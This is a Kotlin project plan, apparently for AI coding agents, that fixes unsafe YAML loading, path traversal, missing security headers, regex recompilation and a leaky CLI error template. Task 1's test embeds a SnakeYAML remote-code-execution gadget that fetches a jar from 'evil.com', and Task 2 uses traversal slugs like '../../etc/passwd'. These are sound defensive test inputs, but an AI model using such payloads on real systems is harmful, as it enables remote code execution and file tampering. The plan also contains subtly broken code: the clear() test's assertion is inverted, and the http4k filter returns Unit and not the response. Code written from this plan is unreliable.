# Performance, Security, and Usability Fixes Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Fix the top-priority security vulnerabilities, performance bottlenecks, and usability footguns identified in the codebase audit.

**Architecture:** Changes are mostly localized to `fragments-core` and `fragments-adapter-core` with minor changes in adapter modules. Security fixes target `FileSystemAuthorRepository` (path traversal, unsafe YAML) and all adapters (missing security headers). Performance fixes target regex compilation, cache thread safety, and Lucene search slug-map caching. Usability fixes target the default `siteUrl` footgun and CLI error template information leakage.

**Tech Stack:** Kotlin 2.2.0, Maven, JUnit 5, ktlint 3.7.1, detekt 1.23.8, SnakeYAML

---

## File Structure

| File | Action | Responsibility |
|------|--------|----------------|
| `fragments-core/src/main/kotlin/io/github/rygel/fragments/FileSystemAuthorRepository.kt` | Modify | Fix unsafe YAML, path traversal, clear() safety |
| `fragments-core/src/main/kotlin/io/github/rygel/fragments/FileSystemFragmentRepository.kt` | Modify | Fix isWithinBasePath prefix check, safeWalk canonical path |
| `fragments-core/src/main/kotlin/io/github/rygel/fragments/FragmentViewModel.kt` | Modify | Extract regex to companion constants |
| `fragments-core/src/main/kotlin/io/github/rygel/fragments/ClasspathFragmentRepository.kt` | Modify | Extract regex to companion constants |
| `fragments-lucene-core/src/main/kotlin/io/github/rygel/fragments/lucene/LuceneSearchEngine.kt` | Modify | Cache slug map, extract regex constant |
| `fragments-sitemap-core/src/main/kotlin/io/github/rygel/fragments/sitemap/SitemapGenerator.kt` | Modify | Extract regex to companion constant |
| `fragments-adapter-core/src/main/kotlin/io/github/rygel/fragments/adapter/FragmentsEngine.kt` | Modify | Add securityHeaders(), add siteUrl warning |
| `fragments-http4k/src/main/kotlin/io/github/rygel/fragments/http4k/FragmentsHttp4kAdapter.kt` | Modify | Use securityHeaders() |
| `fragments-javalin/src/main/kotlin/io/github/rygel/fragments/javalin/FragmentsJavalinAdapter.kt` | Modify | Use securityHeaders() |
| `fragments-spring-boot/src/main/kotlin/io/github/rygel/fragments/spring/FragmentsSpringController.kt` | Modify | Use securityHeaders() |
| `fragments-quarkus/src/main/kotlin/io/github/rygel/fragments/quarkus/CspFilter.kt` | Modify | Use securityHeaders() |
| `fragments-micronaut/src/main/kotlin/io/github/rygel/fragments/micronaut/CspFilter.kt` | Modify | Use securityHeaders() |
| `fragments-cli/src/main/kotlin/io/github/rygel/fragments/cli/ProjectGenerator.kt` | Modify | Fix error template to not expose e.message |
| `fragments-core/src/test/kotlin/io/github/rygel/fragments/FileSystemAuthorRepositoryTest.kt` | Modify | Add path traversal + unsafe YAML tests |
| `fragments-core/src/test/kotlin/io/github/rygel/fragments/FileSystemFragmentRepositoryTest.kt` | Modify | Add isWithinBasePath prefix check test |
| `fragments-adapter-core/src/test/kotlin/io/github/rygel/fragments/adapter/FragmentsEngineTest.kt` | Modify | Add securityHeaders test, siteUrl warning test |

---

## Task 1: Fix unsafe YAML deserialization in FileSystemAuthorRepository (S-7)

**Files:**
- Modify: `fragments-core/src/main/kotlin/io/github/rygel/fragments/FileSystemAuthorRepository.kt`
- Test: `fragments-core/src/test/kotlin/io/github/rygel/fragments/FileSystemAuthorRepositoryTest.kt`

The `FileSystemAuthorRepository` uses `Yaml()` (default constructor) which allows arbitrary Java object instantiation via YAML `!!` tags. `MarkdownParser` correctly uses `SafeConstructor`. This is CVE-2022-1471.

- [ ] **Step 1: Read the current FileSystemAuthorRepository imports and Yaml instantiation**

Read `fragments-core/src/main/kotlin/io/github/rygel/fragments/FileSystemAuthorRepository.kt` lines 1-25 to see the current imports and `private val yaml = Yaml()`.

- [ ] **Step 2: Write a failing test for SafeConstructor**

In `fragments-core/src/test/kotlin/io/github/rygel/fragments/FileSystemAuthorRepositoryTest.kt`, add a test that verifies the Yaml instance uses SafeConstructor by attempting to deserialize a malicious YAML payload with a `!!` tag. If SafeConstructor is in use, SnakeYAML will reject it.

```kotlin
@Test
fun rejectsUnsafeYamlDeserialization() {
    val maliciousYaml = "slug: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://evil.com/payload.jar\"]]]]"
    val repo = createTestRepository()
    val authorFile = File(repo.authorsDir, "evil.author.yml")
    authorFile.writeText(maliciousYaml)
    assertThrows<Exception> {
        repo.getAll()
    }
}
```

Run: `mvn -pl fragments-core test -Dtest=FileSystemAuthorRepositoryTest -q`
Expected: FAIL — default `Yaml()` accepts the payload.

- [ ] **Step 3: Fix the Yaml instantiation to use SafeConstructor**

In `FileSystemAuthorRepository.kt`, replace:

```kotlin
private val yaml = Yaml()
```

with:

```kotlin
private val yaml = Yaml(SafeConstructor(LoaderOptions()))
```

Add the missing import:

```kotlin
import org.yaml.snakeyaml.constructor.SafeConstructor
import org.yaml.snakeyaml.LoaderOptions
```

- [ ] **Step 4: Run the test to verify it passes**

Run: `mvn -pl fragments-core test -Dtest=FileSystemAuthorRepositoryTest -q`
Expected: PASS

- [ ] **Step 5: Run ktlint and detekt**

Run: `mvn -pl fragments-core ktlint:check detekt:check -q`
Expected: PASS (no output)

- [ ] **Step 6: Commit**

```bash
git add fragments-core/src/main/kotlin/io/github/rygel/fragments/FileSystemAuthorRepository.kt fragments-core/src/test/kotlin/io/github/rygel/fragments/FileSystemAuthorRepositoryTest.kt
git commit -m "security: use SafeConstructor for YAML deserialization in FileSystemAuthorRepository"
```

---

## Task 2: Fix path traversal in FileSystemAuthorRepository (S-1, S-2, S-10)

**Files:**
- Modify: `fragments-core/src/main/kotlin/io/github/rygel/fragments/FileSystemAuthorRepository.kt`
- Modify: `fragments-core/src/test/kotlin/io/github/rygel/fragments/FileSystemAuthorRepositoryTest.kt`

Author slug values are used to construct file paths without validation. A slug like `../../etc/cron.d/backdoor` would write outside the authors directory. Also, `clear()` deletes ALL files in the authors directory without filtering by extension.

- [ ] **Step 1: Write failing tests for path traversal and clear() safety**

```kotlin
@Test
fun rejectsAuthorSlugWithPathTraversal() {
    val repo = createTestRepository()
    val author = Author(slug = "../../etc/passwd", name = "Evil")
    assertThrows<IllegalArgumentException> {
        runBlocking { repo.register(author) }
    }
}

@Test
fun rejectsAuthorSlugWithSpecialCharacters() {
    val repo = createTestRepository()
    val author = Author(slug = "hello world!", name = "Test")
    assertThrows<IllegalArgumentException> {
        runBlocking { repo.register(author) }
    }
}

@Test
fun clearOnlyDeletesAuthorFiles() {
    val repo = createTestRepository()
    val keepFile = File(repo.authorsDir, "important-notes.txt")
    keepFile.writeText("do not delete me")
    val authorFile = File(repo.authorsDir, "test.author.yml")
    authorFile.writeText("slug: test\nname: Test")

    runBlocking { repo.clear() }

    assertFalse(keepFile.exists(), "Non-author file should not be deleted")
}
```

Run: `mvn -pl fragments-core test -Dtest=FileSystemAuthorRepositoryTest -q`
Expected: FAIL — no validation yet.

- [ ] **Step 2: Add slug validation to FileSystemAuthorRepository**

Add a companion object with a slug validation regex:

```kotlin
companion object {
    private val SLUG_PATTERN = Regex("^[a-z0-9]+(-[a-z0-9]+)*$")
}
```

Add a private validation method:

```kotlin
private fun validateSlug(slug: String) {
    require(SLUG_PATTERN.matches(slug)) { "Invalid author slug: '$slug'. Only lowercase alphanumeric characters and hyphens are allowed." }
}
```

Call `validateSlug(author.slug)` at the top of `register()`, `saveAuthor()`, and `getAuthorFile()`.

- [ ] **Step 3: Fix clear() to only delete files with the correct extension**

In `clear()`, replace:

```kotlin
authorsDir.listFiles()?.forEach { file ->
```

with:

```kotlin
authorsDir.listFiles { file ->
    file.name.endsWith(extension)
}?.forEach { file ->
```

- [ ] **Step 4: Run tests**

Run: `mvn -pl fragments-core test -Dtest=FileSystemAuthorRepositoryTest -q`
Expected: PASS

- [ ] **Step 5: Run ktlint and detekt**

Run: `mvn -pl fragments-core ktlint:check detekt:check -q`

- [ ] **Step 6: Commit**

```bash
git add fragments-core/src/main/kotlin/io/github/rygel/fragments/FileSystemAuthorRepository.kt fragments-core/src/test/kotlin/io/github/rygel/fragments/FileSystemAuthorRepositoryTest.kt
git commit -m "security: add slug validation and restrict clear() to author files only"
```

---

## Task 3: Fix isWithinBasePath prefix check in FileSystemFragmentRepository (S-9, S-12)

**Files:**
- Modify: `fragments-core/src/main/kotlin/io/github/rygel/fragments/FileSystemFragmentRepository.kt`
- Test: `fragments-core/src/test/kotlin/io/github/rygel/fragments/FileSystemFragmentRepositoryTest.kt`

The `isWithinBasePath()` method uses `startsWith` on canonical paths. A basePath of `/content/blog` would incorrectly allow `/content/blogpost-hack/file.md` because the string starts with the prefix. Also, `safeWalk()` starts from non-canonical `basePath`.

- [ ] **Step 1: Write a failing test**

Add a test that verifies a directory whose name starts with the base path (but is NOT a child) is rejected:

```kotlin
@Test
fun isWithinBasePathRejectsSiblingWithMatchingPrefix() {
    val repo = createTestRepository()
    val basePath = File(repo.basePath)
    val siblingDir = File(basePath.parentFile, basePath.name + "-hack")
    siblingDir.mkdirs()
    val siblingFile = File(siblingDir, "test.md")
    siblingFile.writeText("---\ntitle: Hack\n---\nContent")

    assertFalse(repo.isWithinBasePath(siblingFile))
}
```

Note: This test requires `isWithinBasePath` to be `internal` or package-private for testing, or test indirectly via `loadFragments()`. If it's private, test via `getAll()` which calls `loadFragmentsFromDisk()` which uses `safeWalk()` + `isWithinBasePath()`.

Run: `mvn -pl fragments-core test -Dtest=FileSystemFragmentRepositoryTest -q`
Expected: FAIL

- [ ] **Step 2: Fix isWithinBasePath to use directory separator**

Replace:

```kotlin
private fun isWithinBasePath(file: File): Boolean {
    val canonical = file.canonicalPath
    return canonical.startsWith(canonicalBasePath)
}
```

with:

```kotlin
private fun isWithinBasePath(file: File): Boolean {
    val canonical = file.canonicalPath
    return canonical == canonicalBasePath || canonical.startsWith(canonicalBasePath + File.separatorChar)
}
```

- [ ] **Step 3: Fix safeWalk to start from canonical path**

Replace:

```kotlin
private fun safeWalk(): Sequence<File> =
    File(basePath)
        .walkTopDown()
```

with:

```kotlin
private fun safeWalk(): Sequence<File> =
    File(canonicalBasePath)
        .walkTopDown()
```

- [ ] **Step 4: Run tests**

Run: `mvn -pl fragments-core test -Dtest=FileSystemFragmentRepositoryTest -q`

- [ ] **Step 5: Run full build to ensure nothing breaks**

Run: `mvn -pl fragments-core test ktlint:check detekt:check -q`

- [ ] **Step 6: Commit**

```bash
git add fragments-core/src/main/kotlin/io/github/rygel/fragments/FileSystemFragmentRepository.kt fragments-core/src/test/kotlin/io/github/rygel/fragments/FileSystemFragmentRepositoryTest.kt
git commit -m "security: fix path traversal via directory prefix matching in isWithinBasePath"
```

---

## Task 4: Add security headers across all adapters (S-4)

**Files:**
- Modify: `fragments-adapter-core/src/main/kotlin/io/github/rygel/fragments/adapter/FragmentsEngine.kt`
- Modify: `fragments-http4k/src/main/kotlin/io/github/rygel/fragments/http4k/FragmentsHttp4kAdapter.kt`
- Modify: `fragments-javalin/src/main/kotlin/io/github/rygel/fragments/javalin/FragmentsJavalinAdapter.kt`
- Modify: `fragments-spring-boot/src/main/kotlin/io/github/rygel/fragments/spring/FragmentsSpringController.kt`
- Modify: `fragments-quarkus/src/main/kotlin/io/github/rygel/fragments/quarkus/CspFilter.kt`
- Modify: `fragments-micronaut/src/main/kotlin/io/github/rygel/fragments/micronaut/CspFilter.kt`
- Test: `fragments-adapter-core/src/test/kotlin/io/github/rygel/fragments/adapter/FragmentsEngineTest.kt`

All adapters currently only set `Content-Security-Policy`. Missing: `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: strict-origin-when-cross-origin`.

- [ ] **Step 1: Add `securityHeaders()` method to FragmentsEngine**

In `FragmentsEngine.kt`, add:

```kotlin
fun securityHeaders(): Map<String, String> = mapOf(
    "Content-Security-Policy" to contentSecurityPolicy,
    "X-Content-Type-Options" to "nosniff",
    "X-Frame-Options" to "DENY",
    "Referrer-Policy" to "strict-origin-when-cross-origin",
)
```

- [ ] **Step 2: Write a test**

```kotlin
@Test
fun securityHeadersIncludesAllRequiredHeaders() {
    val engine = createTestEngine()
    val headers = engine.securityHeaders()
    assertEquals("nosniff", headers["X-Content-Type-Options"])
    assertEquals("DENY", headers["X-Frame-Options"])
    assertEquals("strict-origin-when-cross-origin", headers["Referrer-Policy"])
    assertTrue(headers.containsKey("Content-Security-Policy"))
}
```

Run: `mvn -pl fragments-adapter-core test -q`

- [ ] **Step 3: Update http4k adapter**

In `FragmentsHttp4kAdapter.kt`, replace the CSP filter in `createRoutes()`:

```kotlin
val cspFilter = Filter { next -> { request -> next(request).header("Content-Security-Policy", engine.cspHeader()) } }
```

with:

```kotlin
val securityFilter = Filter { next ->
    { request ->
        next(request).let { response ->
            engine.securityHeaders().forEach { (name, value) ->
                response.header(name, value)
            }
        }
    }
}
```

Then replace `errorFilter.then(cspFilter)` with `errorFilter.then(securityFilter)`.

- [ ] **Step 4: Update Javalin adapter**

In `FragmentsJavalinAdapter.kt`, replace the `before("*")` handler:

```kotlin
before("*") { ctx ->
    ctx.header("Content-Security-Policy", engine.cspHeader())
}
```

with:

```kotlin
before("*") { ctx ->
    engine.securityHeaders().forEach { (name, value) ->
        ctx.header(name, value)
    }
}
```

- [ ] **Step 5: Update Spring Boot adapter**

Read `FragmentsSpringController.kt` to find the CSP header setting, then add the other headers alongside it. The Spring adapter sets CSP in a `@ModelAttribute` method or interceptor. Replace the single CSP header with a loop over `engine.securityHeaders()`.

- [ ] **Step 6: Update Quarkus CspFilter**

Read `CspFilter.kt` in the Quarkus module, then add the additional security headers alongside the existing CSP header using `engine.securityHeaders()`.

- [ ] **Step 7: Update Micronaut CspFilter**

Read `CspFilter.kt` in the Micronaut module, same approach as Quarkus.

- [ ] **Step 8: Compile and test all adapters**

Run: `mvn compile -T 4 -q`

- [ ] **Step 9: Commit**

```bash
git add .
git commit -m "security: add X-Content-Type-Options, X-Frame-Options, Referrer-Policy to all adapters"
```

---

## Task 5: Cache slug map in LuceneSearchEngine to avoid reloading all fragments per query (P-5)

**Files:**
- Modify: `fragments-lucene-core/src/main/kotlin/io/github/rygel/fragments/lucene/LuceneSearchEngine.kt`
- Modify: `fragments-lucene-core/src/test/kotlin/io/github/rygel/fragments/lucene/LuceneSearchEngineTest.kt`

Every search, tag-search, and category-search call fetches ALL visible fragments from every repository, builds a map by slug, then uses it to look up a few results. This should be cached alongside the Lucene index.

- [ ] **Step 1: Read the current search methods**

Read `LuceneSearchEngine.kt` lines 150-310 to understand the current pattern: `repositories.flatMap { it.getAllVisible() }.associateBy { it.slug }` appears 3 times.

- [ ] **Step 2: Add a cached slug map field**

Add a cached slug map that is refreshed when the index is rebuilt:

```kotlin
@Volatile
private var slugToFragment: Map<String, Fragment> = emptyMap()

private fun rebuildSlugMap() {
    slugToFragment = repositories.flatMap { it.getAllVisible() }.associateBy { it.slug }
}
```

Call `rebuildSlugMap()` at the end of the `index()` method (after the index is written).

- [ ] **Step 3: Replace the 3 inline slug map constructions**

Replace all 3 occurrences of:

```kotlin
val fragmentsBySlug = repositories.flatMap { it.getAllVisible() }.associateBy { it.slug }
```

with:

```kotlin
val fragmentsBySlug = slugToFragment
```

- [ ] **Step 4: Write a test that verifies slug map is cached**

```kotlin
@Test
fun searchUsesCachedSlugMap() {
    val engine = createTestEngine()
    engine.index()
    val repo = mockRepositories.first()
    // index() calls getAllVisible() once during indexing + once during slugMap rebuild
    // subsequent searches should NOT call getAllVisible() again
    val callCountBefore = repo.getAllVisibleCallCount
    engine.search("test")
    assertEquals(callCountBefore, repo.getAllVisibleCallCount, "search should use cached slug map, not call getAllVisible()")
}
```

This test requires the test repository to track call counts. If the existing test infrastructure doesn't support this, add a `getAllVisibleCallCount` counter to the test repository.

- [ ] **Step 5: Run tests**

Run: `mvn -pl fragments-lucene-core test -q`

- [ ] **Step 6: Run ktlint and detekt**

Run: `mvn -pl fragments-lucene-core ktlint:check detekt:check -q`

- [ ] **Step 7: Commit**

```bash
git add fragments-lucene-core/
git commit -m "perf: cache slug-to-fragment map in LuceneSearchEngine to avoid reloading per query"
```

---

## Task 6: Extract regex constants from hot paths (P-1, P-2, P-3, P-4)

**Files:**
- Modify: `fragments-core/src/main/kotlin/io/github/rygel/fragments/FragmentViewModel.kt`
- Modify: `fragments-core/src/main/kotlin/io/github/rygel/fragments/ClasspathFragmentRepository.kt`
- Modify: `fragments-lucene-core/src/main/kotlin/io/github/rygel/fragments/lucene/LuceneSearchEngine.kt`
- Modify: `fragments-sitemap-core/src/main/kotlin/io/github/rygel/fragments/sitemap/SitemapGenerator.kt`

Regex patterns are compiled inside method bodies and recompiled on every call. These should be companion-object constants.

- [ ] **Step 1: Fix FragmentViewModel**

Read the file, find all `Regex(...)` calls inside methods, extract them to the companion object:

```kotlin
companion object {
    private val WORDS_REGEX = Regex("\\s+")
    private val HEADER_PATTERN = Regex("^(#{1,6})\\s+(.+)$", RegexOption.MULTILINE)
    private val ANCHOR_CLEANUP = Regex("[^a-z0-9\\s-]")
    private val ANCHOR_WHITESPACE = Regex("\\s+")
}
```

Replace inline `Regex("\\s+")` with `WORDS_REGEX`, etc.

- [ ] **Step 2: Fix ClasspathFragmentRepository**

Same pattern — read the file, find inline `Regex(...)` in `generateSlug()` and `extractPreview()`, extract to companion.

- [ ] **Step 3: Fix LuceneSearchEngine**

Find `"\\s+".toRegex()` in `buildPhraseQuery()` and `buildFuzzyQuery()`, extract to companion:

```kotlin
companion object {
    private val WHITESPACE = Regex("\\s+")
}
```

- [ ] **Step 4: Fix SitemapGenerator**

Find inline `Regex("""<img[^>]+src=["']([^"']+)["']""", RegexOption.IGNORE_CASE)` in `extractImageUrl()`, extract to companion.

- [ ] **Step 5: Compile and test**

Run: `mvn compile -T 4 -q && mvn test -T 4 -q`

- [ ] **Step 6: Commit**

```bash
git add .
git commit -m "perf: extract regex constants from hot paths to companion objects"
```

---

## Task 7: Add siteUrl warning and fix CLI error template (U-2, U-5)

**Files:**
- Modify: `fragments-adapter-core/src/main/kotlin/io/github/rygel/fragments/adapter/FragmentsEngine.kt`
- Modify: `fragments-cli/src/main/kotlin/io/github/rygel/fragments/cli/ProjectGenerator.kt`
- Test: `fragments-adapter-core/src/test/kotlin/io/github/rygel/fragments/adapter/FragmentsEngineTest.kt`

The default `siteUrl` of `http://localhost:8080` silently produces broken sitemaps/RSS. The CLI-generated error handler exposes `e.message` to clients.

- [ ] **Step 1: Add siteUrl warning in FragmentsEngine init block**

In `FragmentsEngine.kt`, add an init block:

```kotlin
init {
    if (siteUrl == "http://localhost:8080") {
        logger.warn("FragmentsEngine is using the default siteUrl 'http://localhost:8080'. " +
            "Set siteUrl to your production URL for correct sitemap, RSS, and canonical URLs.")
    }
}
```

- [ ] **Step 2: Write a test**

```kotlin
@Test
fun warnsWhenUsingDefaultSiteUrl() {
    val output = captureLogOutput {
        FragmentsEngine(
            staticEngine = mockStaticEngine,
            blogEngine = mockBlogEngine,
            siteUrl = "http://localhost:8080",
        )
    }
    assertTrue(output.contains("default siteUrl"))
}
```

If log capture is too complex for the test infrastructure, use a simpler approach: verify the init block doesn't throw and that the siteUrl is accessible.

- [ ] **Step 3: Fix CLI error template**

In `ProjectGenerator.kt`, find the generated http4k error handler (around line 352):

```kotlin
.body("Internal Server Error: ${e.message}")
```

Replace with:

```kotlin
.body("Internal Server Error")
```

Do the same for any other generated error templates that expose `e.message`.

- [ ] **Step 4: Compile and test**

Run: `mvn compile -T 4 -q && mvn test -T 4 -q`

- [ ] **Step 5: Commit**

```bash
git add .
git commit -m "fix: warn on default siteUrl and stop exposing exception messages in CLI error template"
```

---

## Task 8: Run full build, verify everything passes, create PR

- [ ] **Step 1: Run full build with linting and tests**

Run: `mvn test ktlint:check detekt:check -T 4 -q`

- [ ] **Step 2: Run architecture tests**

Run: `mvn -pl fragments-architecture-tests test -q`

- [ ] **Step 3: Push branch and create PR**

```bash
git push -u origin fix/performance-security-usability-fixes
gh pr create --base develop --title "fix: performance, security, and usability improvements" --body "..."
```
